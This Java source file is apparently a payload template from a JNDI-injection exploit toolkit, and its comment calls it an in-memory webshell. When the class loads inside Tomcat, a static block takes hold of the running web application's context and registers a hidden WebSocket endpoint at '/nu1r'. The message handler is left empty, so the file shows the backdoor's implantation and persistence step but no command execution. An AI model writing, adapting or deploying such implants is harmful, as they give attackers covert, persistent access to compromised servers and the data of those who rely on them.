package com.nu1r.jndi.template.tomcat;

import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.websocket.server.WsServerContainer;

import javax.websocket.*;
import javax.websocket.server.ServerContainer;
import javax.websocket.server.ServerEndpointConfig;

/**
 * Executor 内存马
 */
public class TWSMSFromThread extends Endpoint implements MessageHandler.Whole<String> {

    static {
        String                wsName                = "/nu1r";
        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        StandardContext       standardContext       = (StandardContext) webappClassLoaderBase.getResources().getContext();
        ServerEndpointConfig  build                 = ServerEndpointConfig.Builder.create(TWSMSFromThread.class, wsName).build();
        WsServerContainer     attribute             = (WsServerContainer) standardContext.getServletContext().getAttribute(ServerContainer.class.getName());
        try {
            attribute.addEndpoint(build);
            standardContext.getServletContext().setAttribute(wsName, wsName);
        } catch (DeploymentException e) {
            throw new RuntimeException(e);
        }
    }

    public Session session;

    public void onMessage(String message) {
    }


    @Override
    public void onOpen(Session session, EndpointConfig config) {
        this.session = session;
        session.addMessageHandler(this);
    }
}
